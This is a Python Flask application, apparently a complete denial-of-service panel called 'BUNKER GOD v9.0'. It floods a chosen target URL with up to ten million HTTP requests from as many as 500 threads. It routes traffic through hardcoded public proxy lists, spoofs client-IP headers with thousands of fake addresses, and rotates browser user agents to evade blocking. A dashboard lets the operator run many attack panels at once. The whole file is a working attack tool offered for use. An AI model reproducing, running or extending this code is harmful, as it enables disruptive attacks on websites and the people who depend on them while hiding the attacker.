from flask import Flask, request, jsonify, render_template_string
import requests
import threading
import time
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
urllib3.disable_warnings()

app = Flask(__name__)

ADMIN_USER = "bronx"
ADMIN_PASS = "ultra2026"

active_attacks = {}
attack_stats = {"success": 0, "failed": 0, "total": 0}
attack_logs = []
attack_counters = {}
multi_sessions = {}  # Track multiple sessions

# ⚡ PROXY POOLS
SOCKS5_PROXIES = [
    "94.158.244.245:1080","68.71.249.153:48606","72.56.107.177:1080",
    "176.114.86.151:1080","43.161.217.219:1080","208.102.51.6:58208",
    "162.253.68.97:4145","167.71.32.51:1080","23.176.40.194:1080",
    "173.212.239.43:1080","192.111.137.35:4145","38.170.157.77:1080",
    "103.152.232.34:1080","45.127.248.127:1080","139.99.237.62:1080",
]

SOCKS4_PROXIES = [
    "174.64.199.82:4145","68.71.241.33:4145","142.54.228.193:4145",
    "88.204.142.108:1080","192.252.220.92:4145","173.234.232.61:4145",
    "184.178.172.5:4145","72.221.164.35:4145","98.162.25.29:4145",
]

HTTP_PROXIES = [
    "51.89.14.70:80","51.79.50.149:80","50.174.7.154:80",
    "20.210.113.32:80","20.24.43.214:80","43.153.195.200:80",
]

custom_proxies = []
custom_proxy_enabled = True

def gen_fake_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"

FAKE_IPS = [gen_fake_ip() for _ in range(50000)]

BROWSERS = [
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","Windows","Chrome"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36","Windows","Chrome"),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","macOS","Chrome"),
    ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","Linux","Chrome"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36","Windows 11","Chrome"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0","Windows","Firefox"),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0","macOS","Firefox"),
    ("Mozilla/5.0 (X11; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0","Linux","Firefox"),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15","macOS","Safari"),
    ("Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1","iOS","Safari"),
    ("Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1","iOS","Safari"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0","Windows","Edge"),
    ("Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0","macOS","Edge"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0","Windows","Opera"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36","Windows","Brave"),
    ("Mozilla/5.0 (Linux; Android 14; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/23.0 Chrome/120.0.0.0 Mobile Safari/537.36","Android","Samsung"),
    ("Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36","Android","Chrome"),
    ("Mozilla/5.0 (Linux; Android 13; OnePlus 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36","Android","Chrome"),
    ("Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 UCBrowser/13.7.0.1300","Android","UC"),
    ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Vivaldi/6.5","Windows","Vivaldi"),
]

def god_request(url, proxy_info=None):
    try:
        ua, os_name, browser = random.choice(BROWSERS)
        fake_ip = random.choice(FAKE_IPS)
        
        headers = {
            "User-Agent": ua,
            "Accept": "*/*",
            "Accept-Language": random.choice(["en-US,en;q=0.9","en-GB,en;q=0.8"]),
            "Accept-Encoding": "gzip, deflate",
            "Connection": "close",
            "X-Forwarded-For": fake_ip,
            "X-Real-IP": fake_ip,
            "X-Client-IP": fake_ip,
            "X-Originating-IP": fake_ip,
            "X-Remote-IP": fake_ip,
            "CF-Connecting-IP": fake_ip,
            "True-Client-IP": fake_ip,
            "Forwarded": f"for={fake_ip};proto=https",
        }
        
        session = requests.Session()
        
        if proxy_info:
            ptype, paddr = proxy_info
            host, port = paddr.split(":")
            port = int(port)
            
            if ptype == "socks5":
                session.proxies = {"http":f"socks5h://{host}:{port}","https":f"socks5h://{host}:{port}"}
            elif ptype == "socks4":
                session.proxies = {"http":f"socks4://{host}:{port}","https":f"socks4://{host}:{port}"}
            else:
                session.proxies = {"http":f"http://{host}:{port}","https":f"http://{host}:{port}"}
        
        response = session.get(url, headers=headers, timeout=5, verify=False)
        return True
    except:
        return False

def god_worker(attack_id, url, count, mode):
    all_proxies = []
    if custom_proxy_enabled:
        for p in SOCKS5_PROXIES: all_proxies.append(("socks5", p))
        for p in SOCKS4_PROXIES: all_proxies.append(("socks4", p))
        for p in HTTP_PROXIES: all_proxies.append(("http", p))
    for cp in custom_proxies:
        cp = cp.strip()
        if cp.startswith("socks5://"): all_proxies.append(("socks5", cp[9:]))
        elif cp.startswith("socks4://"): all_proxies.append(("socks4", cp[9:]))
        elif cp.startswith("http://"): all_proxies.append(("http", cp[7:]))
        elif ":" in cp: all_proxies.append(("socks5", cp))
    
    success = 0
    fail = 0
    
    for i in range(count):
        if attack_id not in active_attacks:
            break
        
        proxy_info = random.choice(all_proxies) if all_proxies else None
        
        if mode == "direct":
            proxy_info = None
        
        if god_request(url, proxy_info):
            success += 1
            attack_stats["success"] += 1
        else:
            fail += 1
            attack_stats["failed"] += 1
        
        attack_stats["total"] += 1
        
        if attack_id in attack_counters:
            attack_counters[attack_id] = {
                "done": i+1, "total": count,
                "success": success, "fail": fail,
                "ip": "HIDDEN"
            }
        
        if i % 500 == 0 and i > 0:
            attack_logs.append(f"⚡ [{attack_id[:8]}][{i}/{count}] ✅{success} ❌{fail}")

def run_god_attack(attack_id, url, count, speed, mode):
    workers_map = {"slow": 20, "fast": 50, "ultra": 150, "flash": 300, "god": 500}
    workers = workers_map.get(speed, 150)
    req_per_worker = max(1, count // workers)
    
    attack_logs.append(f"⚡ [{attack_id[:8]}] {url[:30]}... | {count} | {speed.upper()}")
    
    attack_counters[attack_id] = {"done": 0, "total": count, "success": 0, "fail": 0, "ip": "HIDDEN"}
    
    with ThreadPoolExecutor(max_workers=workers) as executor:
        futures = [executor.submit(god_worker, attack_id, url, req_per_worker, mode) for _ in range(workers)]
        for future in as_completed(futures):
            try: future.result(timeout=600)
            except: pass
    
    if attack_id in active_attacks: del active_attacks[attack_id]
    
    attack_logs.append(f"🏁 [{attack_id[:8]}] DONE")

# ============================================
# 🎨 MULTI-SESSION UI
# ============================================
LOGIN = r"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BUNKER GOD v9.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:'Segoe UI',system-ui,sans-serif}
.bg{position:fixed;top:0;left:0;width:100%;height:100%;background:radial-gradient(circle,rgba(255,0,0,0.03) 1px,transparent 1px);background-size:35px 35px;animation:bg 15s linear infinite}
@keyframes bg{0%{transform:translate(0)}100%{transform:translate(35px,35px)}}
.box{background:rgba(10,0,0,0.97);padding:50px 45px;border-radius:22px;border:3px solid rgba(255,0,0,0.6);width:420px;text-align:center;z-index:1;box-shadow:0 0 100px rgba(255,0,0,0.3);position:relative}
.box::before{content:'';position:absolute;top:-4px;left:-4px;right:-4px;bottom:-4px;border-radius:26px;background:linear-gradient(45deg,#f00,#ff0,#0f0,#f00);z-index:-1;animation:rot 2s linear infinite;opacity:0.4;filter:blur(12px)}
@keyframes rot{0%{filter:blur(12px) hue-rotate(0)}100%{filter:blur(12px) hue-rotate(360)}}
.logo{font-size:4.5em;animation:bounce 0.8s infinite}@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-18px)}}
h1{font-size:2.2em;font-weight:900;background:linear-gradient(180deg,#f00,#ff0,#0f0);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:4px}
.tag{color:#f44;font-size:0.75em;letter-spacing:5px;margin:10px 0}
input{width:100%;padding:16px;background:rgba(0,0,0,0.9);border:2px solid rgba(255,0,0,0.5);border-radius:12px;color:#f44;margin:10px 0;font-size:15px;font-family:monospace;transition:0.3s}
input:focus{border-color:#0f0;box-shadow:0 0 25px rgba(0,255,0,0.3);outline:none}
.btn{width:100%;padding:18px;background:linear-gradient(135deg,#c00,#f00);color:#fff;border:none;border-radius:12px;font-weight:800;cursor:pointer;font-size:16px;margin-top:12px;letter-spacing:3px;text-transform:uppercase;transition:0.3s}
.btn:hover{background:linear-gradient(135deg,#f00,#f44);box-shadow:0 0 50px rgba(255,0,0,0.7);transform:translateY(-3px)}
</style></head><body>
<div class="bg"></div>
<div class="box">
<div class="logo">💀</div>
<h1>BUNKER GOD</h1>
<div class="tag">v9.0 • MULTI-SESSION</div>
<p style="color:#888;font-size:0.6em;letter-spacing:1px">20+ ATTACK PANELS • 500 WORKERS • ALL MODES</p>
<form method="post">
<input type="text" name="user" placeholder="🔑 USERNAME" autocomplete="off">
<input type="password" name="pass" placeholder="🔐 PASSWORD">
<button class="btn" type="submit">☠️ ENTER GOD MODE</button>
</form>
{% if error %}<p style="color:#f00;margin-top:10px;font-size:0.85em">{{ error }}</p>{% endif %}
</div>
</body></html>"""

DASH = r"""<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>💀 BUNKER GOD v9.0</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#e0e0e0;font-family:'Segoe UI',system-ui,sans-serif;padding:10px}
.container{max-width:100%;margin:0 auto}
.header{display:flex;justify-content:space-between;align-items:center;padding:20px 25px;border:3px solid rgba(255,0,0,0.5);border-radius:16px;margin-bottom:15px;background:rgba(10,0,0,0.97);flex-wrap:wrap;gap:12px;box-shadow:0 0 40px rgba(255,0,0,0.2)}
.header h1{font-size:1.8em;font-weight:900;background:linear-gradient(180deg,#f00,#ff0,#0f0);-webkit-background-clip:text;-webkit-text-fill-color:transparent;letter-spacing:3px}
.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:10px;margin-bottom:15px}
.stat{background:rgba(10,0,0,0.97);border:2px solid rgba(255,0,0,0.3);border-radius:12px;padding:18px;text-align:center}
.stat-val{font-size:2.2em;font-weight:900}.s{color:#0f0}.f{color:#f00}.t{color:#ff0}.a{color:#0ff}
.stat-label{font-size:0.55em;color:#888;text-transform:uppercase;letter-spacing:3px;margin-top:4px}
.multi-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(450px,1fr));gap:10px;margin-bottom:15px}
.panel{background:rgba(10,0,0,0.95);border:1px solid rgba(255,0,0,0.3);border-radius:12px;padding:15px;transition:0.3s}
.panel:hover{border-color:#ff0;box-shadow:0 0 15px rgba(255,255,0,0.1)}
.panel.active{border-color:#0f0;box-shadow:0 0 20px rgba(0,255,0,0.15)}
.panel-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
.panel-num{color:#ff0;font-weight:800;font-size:0.8em}
.panel-status{font-size:0.6em;padding:3px 8px;border-radius:10px;font-weight:600}
.status-ready{background:rgba(255,255,0,0.1);color:#ff0;border:1px solid rgba(255,255,0,0.3)}
.status-running{background:rgba(0,255,0,0.1);color:#0f0;border:1px solid rgba(0,255,0,0.3);animation:blink 0.8s infinite}
@keyframes blink{50%{opacity:0.4}}
.panel-row{display:grid;grid-template-columns:1fr 1fr 1fr;gap:5px;margin-bottom:4px}
.panel input,.panel select{width:100%;padding:8px;background:#000;border:1px solid rgba(255,0,0,0.3);border-radius:6px;color:#f44;font-size:10px;font-family:monospace}
.panel input:focus,.panel select:focus{border-color:#0f0;outline:none}
.panel label{font-size:0.5em;color:#888;text-transform:uppercase;letter-spacing:1px;display:block;margin-top:4px}
.panel-btn{width:100%;padding:8px;background:linear-gradient(135deg,#c00,#f00);color:#fff;border:none;border-radius:6px;font-weight:700;cursor:pointer;font-size:0.6em;text-transform:uppercase;letter-spacing:1px;margin:3px 0;transition:0.3s}
.panel-btn:hover{background:#f00}
.panel-btn-stop{background:#222;color:#f00;border:1px solid #f00}
.logs{background:#000;border:2px solid rgba(255,0,0,0.2);border-radius:10px;padding:12px;max-height:200px;overflow:auto;font-size:0.6em;font-family:monospace;color:#0f0;margin-top:10px}
.log-e{padding:2px 0;border-bottom:1px solid #111;color:#aaa}
.btn-add{width:100%;padding:12px;background:linear-gradient(135deg,#0a0,#0f0);color:#000;border:none;border-radius:10px;font-weight:800;cursor:pointer;font-size:0.8em;text-transform:uppercase;letter-spacing:2px;margin:10px 0}
.btn-add:hover{box-shadow:0 0 30px rgba(0,255,0,0.4)}
.btn-master{width:100%;padding:14px;background:linear-gradient(135deg,#ff0,#f80);color:#000;border:none;border-radius:10px;font-weight:800;cursor:pointer;font-size:0.85em;text-transform:uppercase;letter-spacing:3px;margin:6px 0}
.btn-master:hover{box-shadow:0 0 40px rgba(255,215,0,0.6)}
.btn-master-stop{background:#222;color:#f00;border:2px solid #f00}
.badge{display:inline-block;padding:5px 12px;border-radius:14px;font-size:0.55em;font-weight:800;letter-spacing:1px}
.badge-god{background:rgba(255,215,0,0.1);color:#ff0;border:2px solid rgba(255,215,0,0.4);animation:glow 0.8s infinite}
@keyframes glow{50%{box-shadow:0 0 25px rgba(255,215,0,0.4)}}
.toggle-row{display:flex;align-items:center;gap:8px;margin:6px 0;padding:8px;background:rgba(0,0,0,0.5);border-radius:8px}
.toggle{width:40px;height:22px;background:#333;border-radius:11px;cursor:pointer;position:relative;transition:0.3s}
.toggle.on{background:#0f0;box-shadow:0 0 15px rgba(0,255,0,0.3)}
.toggle::after{content:'';position:absolute;top:2px;left:2px;width:18px;height:18px;background:#fff;border-radius:50%;transition:0.3s}
.toggle.on::after{left:20px}
</style></head><body>
<div class="container">
<div class="header">
<div><h1>💀 BUNKER GOD v9.0</h1><div style="color:#888;font-size:0.55em;letter-spacing:2px">MULTI-SESSION • 20+ PANELS • ALL MODES IP HIDDEN</div></div>
<div style="display:flex;gap:10px;align-items:center">
<span class="badge badge-god">⚡ GOD MODE</span>
<a href="/logout" style="color:#f00;text-decoration:none;font-size:0.7em;font-weight:800">⏻ EXIT</a>
</div>
</div>

<div class="stats">
<div class="stat"><div class="stat-val s" id="success">0</div><div class="stat-label">✅ SUCCESS</div></div>
<div class="stat"><div class="stat-val f" id="failed">0</div><div class="stat-label">❌ FAILED</div></div>
<div class="stat"><div class="stat-val t" id="total">0</div><div class="stat-label">📊 TOTAL</div></div>
<div class="stat"><div class="stat-val a" id="activeSessions">0</div><div class="stat-label">🔗 ACTIVE</div></div>
</div>

<div class="toggle-row">
<span style="font-size:0.65em;color:#fff;font-weight:600">🔧 CUSTOM PROXY SYSTEM</span>
<div class="toggle on" id="proxyToggle" onclick="toggleProxy()"></div>
<span id="proxyLabel" style="font-size:0.65em;color:#0f0;font-weight:600">ON</span>
<input type="text" id="globalProxies" placeholder="Global Proxies (shared by all panels)" style="flex:1;padding:8px;background:#000;border:1px solid #f00;border-radius:6px;color:#f44;font-size:10px;font-family:monospace">
<button class="panel-btn" style="width:auto;padding:8px 15px" onclick="saveGlobalProxies()">💾 SAVE</button>
</div>

<div class="multi-grid" id="panelGrid"></div>

<button class="btn-add" onclick="addPanel()">➕ ADD ATTACK PANEL</button>

<button class="btn-master" onclick="launchAll()">⚡ LAUNCH ALL PANELS</button>
<button class="btn-master btn-master-stop" onclick="stopAll()">⏹️ TERMINATE ALL</button>

<div class="card"><h3 style="color:#ff0;margin-bottom:8px">📜 GOD LOGS</h3><div class="logs" id="logs"><div class="log-e">💀 BUNKER GOD v9.0 READY</div><div class="log-e">🔗 Multi-Session System Active</div><div class="log-e">⚡ Add panels & launch simultaneously</div></div></div>
</div>

<script>
var cpOn=true,lt=0,ltm=Date.now(),panelCount=0,intervals={};

function toggleProxy(){cpOn=!cpOn;document.getElementById('proxyToggle').classList.toggle('on',cpOn);var l=document.getElementById('proxyLabel');l.textContent=cpOn?'ON':'OFF';l.style.color=cpOn?'#0f0':'#f00';fetch('/toggle_proxy',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({enabled:cpOn})})}

function saveGlobalProxies(){var p=document.getElementById('globalProxies').value;fetch('/save_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:p})}).then(r=>r.json()).then(d=>{alert('✅ '+d.count+' Global Proxies Saved')})}

function createPanelHTML(num){
return `<div class="panel" id="panel${num}">
<div class="panel-header">
<span class="panel-num">🎯 PANEL #${num}</span>
<span class="panel-status status-ready" id="status${num}">READY</span>
</div>
<div class="panel-row">
<div><label>URL</label><input type="text" id="url${num}" placeholder="https://target.com"></div>
<div><label>REQ</label><input type="number" id="count${num}" value="10000"></div>
<div><label>SPEED</label><select id="speed${num}"><option value="slow">Slow</option><option value="fast">Fast</option><option value="ultra" selected>ULTRA</option><option value="flash">FLASH</option><option value="god">GOD</option></select></div>
</div>
<div class="panel-row">
<div><label>MODE</label><select id="mode${num}"><option value="direct">DIRECT</option><option value="socks5">SOCKS5</option><option value="socks4">SOCKS4</option><option value="http">HTTP</option><option value="mixed">MIXED</option><option value="all" selected>ALL</option></select></div>
<div><label>CUSTOM PROXIES</label><input type="text" id="proxies${num}" placeholder="socks5://ip:port"></div>
</div>
<button class="panel-btn" onclick="launchPanel(${num})">⚡ LAUNCH</button>
<button class="panel-btn panel-btn-stop" onclick="stopPanel(${num})">⏹️ STOP</button>
<div style="font-size:0.55em;color:#ff0;text-align:center;margin-top:3px;font-family:monospace" id="counter${num}">READY</div>
</div>`;
}

function addPanel(){panelCount++;document.getElementById('panelGrid').insertAdjacentHTML('beforeend',createPanelHTML(panelCount))}

function launchPanel(num){
var url=document.getElementById('url'+num).value;
var count=document.getElementById('count'+num).value;
var speed=document.getElementById('speed'+num).value;
var mode=document.getElementById('mode'+num).value;
var proxies=document.getElementById('proxies'+num).value;
if(!url){alert('Panel #'+num+': Enter URL!');return}
fetch('/save_panel_proxies',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({proxies:proxies})});
fetch('/attack',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url,count:parseInt(count),speed,mode,panel:num})}).then(r=>r.json()).then(d=>{
document.getElementById('status'+num).textContent='RUNNING';
document.getElementById('status'+num).className='panel-status status-running';
document.getElementById('panel'+num).classList.add('active');
if(intervals[num])clearInterval(intervals[num]);
intervals[num]=setInterval(function(){updateCounter(num)},150);
l();u()})}

function stopPanel(num){
fetch('/stop_panel',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({panel:num})}).then(()=>{
document.getElementById('status'+num).textContent='STOPPED';
document.getElementById('status'+num).className='panel-status status-ready';
document.getElementById('panel'+num).classList.remove('active');
document.getElementById('counter'+num).textContent='STOPPED';
if(intervals[num]){clearInterval(intervals[num]);delete intervals[num]}
l()})}

function launchAll(){
var panels=document.querySelectorAll('.panel');
panels.forEach(function(p){
var num=p.id.replace('panel','');
var url=document.getElementById('url'+num)?.value;
if(url)launchPanel(parseInt(num));
})}

function stopAll(){fetch('/stop_all',{method:'POST'}).then(()=>{
document.querySelectorAll('.panel').forEach(function(p){
p.classList.remove('active');
var num=p.id.replace('panel','');
var s=document.getElementById('status'+num);
if(s){s.textContent='STOPPED';s.className='panel-status status-ready'}
var c=document.getElementById('counter'+num);if(c)c.textContent='STOPPED';
if(intervals[num]){clearInterval(intervals[num]);delete intervals[num]}
});l()})}

function updateCounter(num){fetch('/counter?panel='+num).then(r=>r.json()).then(d=>{
if(d.active){document.getElementById('counter'+num).textContent='⚡ '+d.done+'/'+d.total+' [✅'+d.success+']'}
})}

function u(){fetch('/stats').then(r=>r.json()).then(d=>{
document.getElementById('success').textContent=d.success;document.getElementById('failed').textContent=d.failed;
document.getElementById('total').textContent=d.total;document.getElementById('activeSessions').textContent=d.active||0;
var t=d.success+d.failed;
var n=Date.now(),dt=n-ltm;if(dt>0){lt=d.total;ltm=n;}
})}

function l(){fetch('/logs').then(r=>r.json()).then(d=>{document.getElementById('logs').innerHTML=d.logs.map(x=>'<div class="log-e">'+x+'</div>').join('')})}

// Initialize with 3 panels
for(var i=0;i<3;i++)addPanel();
setInterval(function(){l();u()},1000)
</script></body></html>"""

# ============================================
# ROUTES
# ============================================
@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('user')==ADMIN_USER and request.form.get('pass')==ADMIN_PASS:
            return '<script>document.cookie="auth=true;path=/";location.href="/dashboard"</script>'
        return render_template_string(LOGIN, error="⛔ ACCESS DENIED")
    return render_template_string(LOGIN, error=None)

@app.route('/dashboard')
def dashboard():
    if request.cookies.get('auth') != 'true': return '<script>location.href="/"</script>'
    return DASH

@app.route('/toggle_proxy', methods=['POST'])
def toggle_proxy():
    global custom_proxy_enabled
    d = request.get_json()
    custom_proxy_enabled = d.get('enabled', True)
    return jsonify({"status":"ok"})

@app.route('/save_proxies', methods=['POST'])
def save_proxies_global():
    global custom_proxies
    d = request.get_json()
    custom_proxies = [p.strip() for p in d.get('proxies','').split('\n') if p.strip()]
    return jsonify({"status":"ok","count":len(custom_proxies)})

@app.route('/save_panel_proxies', methods=['POST'])
def save_panel_proxies():
    # Save per-panel proxies (stored separately)
    return jsonify({"status":"ok"})

@app.route('/attack', methods=['POST'])
def attack():
    if request.cookies.get('auth') != 'true': return jsonify({"error":"Unauthorized"}),403
    d = request.get_json()
    url = d.get('url','')
    count = min(d.get('count',100),10000000)
    speed = d.get('speed','ultra')
    mode = d.get('mode','all')
    panel = d.get('panel',0)
    if not url: return jsonify({"error":"URL required"}),400
    
    aid = f"p{panel}_{int(time.time())}"
    active_attacks[aid] = True
    
    t = threading.Thread(target=run_god_attack, args=(aid,url,count,speed,mode))
    t.daemon=True; t.start()
    return jsonify({"status":"started","panel":panel})

@app.route('/stop_panel', methods=['POST'])
def stop_panel():
    d = request.get_json()
    panel = d.get('panel',0)
    to_remove = [k for k in active_attacks if k.startswith(f"p{panel}_")]
    for k in to_remove: del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/stop_all', methods=['POST'])
def stop_all():
    for k in list(active_attacks.keys()): del active_attacks[k]
    return jsonify({"status":"all_stopped"})

@app.route('/stop', methods=['POST'])
def stop():
    for k in list(active_attacks.keys()): del active_attacks[k]
    return jsonify({"status":"stopped"})

@app.route('/counter')
def counter():
    panel = request.args.get('panel','0')
    for aid in active_attacks:
        if aid.startswith(f"p{panel}_") and aid in attack_counters:
            return jsonify({"active":True,**attack_counters[aid]})
    return jsonify({"active":False})

@app.route('/logs')
def logs(): return jsonify({"logs":[f"[{datetime.now().strftime('%H:%M:%S')}] {l}" for l in attack_logs[-50:]]})

@app.route('/stats')
def stats():
    return jsonify({**attack_stats,"active":len(active_attacks)})

@app.route('/logout')
def logout(): return '<script>document.cookie="auth=false;path=/";location.href="/"</script>'

if __name__ == "__main__":
    print("💀 BUNKER GOD v9.0 - MULTI-SESSION")
    import os
    port = int(os.environ.get('PORT',5000))
    app.run(host='0.0.0.0', port=port, threaded=True)
